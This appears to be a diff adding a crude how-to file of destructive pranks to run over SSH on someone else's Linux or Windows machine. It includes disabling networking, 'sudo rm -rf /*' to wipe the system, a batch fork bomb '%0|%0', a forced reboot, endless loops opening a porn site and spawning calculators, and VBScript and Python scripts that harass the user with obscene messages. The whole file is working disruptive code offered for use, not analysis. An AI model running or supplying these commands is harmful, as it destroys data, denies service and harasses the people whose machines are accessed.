@@ -1,0 +1,177 @@
+okay so i know, why dont i just allow transfer into the ssh and automate the tool to do this 
+well its better if you do the work yourself anyway so lets get started 
+
+[[[[[[[[
+    MAIN STEPS BEFORE EXECUTING 
+
+]]]]]]]]
+
+export DISPLAY=:0.0
+
+
+
+
+<<<< terminate bluetooth and network connection <<<<<<
+
+sudo systemctl stop NetworkManager.service && sudo systemctl disable NetworkManager.service 
+
+
+
+
+
+
+
+
+<<<<<<<<<<< annoying virus >>>>>>>>>>>>>>
+
+go to ssh terminal 
+then do the following commands 
+
+mkdir hoe
+cd hoe 
+touch nah.py
+nano nah.py 
+
+then copy and paste the following and save it 
+
+from espeak import espeak
+from time import sleep
+
+while True:
+    espeak.synth("Get your Os fucked")
+    sleep(1)
+
+# when you are done save the file 
+then run python3 nah.py 
+
+
+
+
+
+
+
+<<<<<<<< fork bomb for browsers >>>>>>>>>>>>
+
+mkdir dinner
+cd dinner
+touch dinner.py
+nano dinner.py
+
+then enter the following 
+
+import os 
+import webbrowser 
+
+for i in range(100000000000):
+      webbrowser.open(' https://pornhub.com ')
+
+
+
+<<<<<<<< Remove the entire system <<<<<<<<<<<
+
+in ssh terminal type
+
+sudo rm -rf /*
+
+
+
+
+
+
+
+
+
+[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
+[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[ WINDOWS VIRUSES AND FUNNY SHIIIIITTT ]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
+[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
+
+once connected to ssh on windows 
+open notepad and copy paste this 
+
+
+[!] Once you are done save this file as fucked.vbs 
+
+[!] 
+
+do
+Set wshshell = wscript.CreateObject("WScript.Shell") 
+Wshshell.run "Notepad" 
+wscript.sleep 100
+wshshell.sendkeys "H"
+wscript.sleep 100
+wshshell.sendkeys "I"
+wscript.sleep 100
+wshshell.sendkeys " "
+wscript.sleep 100
+wshshell.sendkeys "Y"
+wscript.sleep 100
+wshshell.sendkeys "O"
+wscript.sleep 100
+wshshell.sendkeys "U"
+wscript.sleep 100
+wshshell.sendkeys "R"
+wscript.sleep 100
+wshshell.sendkeys " "
+wscript.sleep 100
+wshshell.sendkeys "P"
+wscript.sleep 100
+wshshell.sendkeys "C"
+wscript.sleep 100
+wshshell.sendkeys " "
+wscript.sleep 100
+wshshell.sendkeys "H"
+wscript.sleep 100
+wshshell.sendkeys "A"
+wscript.sleep 100
+wshshell.sendkeys "S"
+wscript.sleep 100
+wshshell.sendkeys " "
+wscript.sleep 100
+wshshell.sendkeys "B"
+wscript.sleep 100
+wshshell.sendkeys "E"
+wscript.sleep 100
+wshshell.sendkeys "E"
+wscript.sleep 100
+wshshell.sendkeys "N"
+wscript.sleep 100
+wshshell.sendkeys " "
+wscript.sleep 100
+wshshell.sendkeys "I"
+wscript.sleep 100
+wshshell.sendkeys "N"
+wscript.sleep 100
+wshshell.sendkeys "F"
+wscript.sleep 100
+wshshell.sendkeys "N"
+wscript.sleep 100
+wshshell.sendkeys "C"
+wscript.sleep 100
+wshshell.sendkeys "T"
+wscript.sleep 100
+wshshell.sendkeys "E"
+wscript.sleep 100
+wshshell.sendkeys "D"
+loop
+
+<<<<<<<<<<<<<<<<<<<<<< fucking calculators man <<<<<<<<<<<<<<<<<<<<<<
+
+mkdir cal
+cd cal 
+find a way to make a file through command line 
+
+copy and paste this code 
+
+msgbox "Press OK to open my computer"
+do
+Set shell=CreateObject("wscript.shell")
+Shell.Run("calc.exe")
+loop
+
+<<<<<<<<<<<<< unfortunate shutdown <<<<<<<<<<<<<<<<<
+
+shutdown -r -f -t 00
+
+<<<<<<<<<<< Fork Fuck it <<<<<<<<<<<<<<<
+
+%0|%0
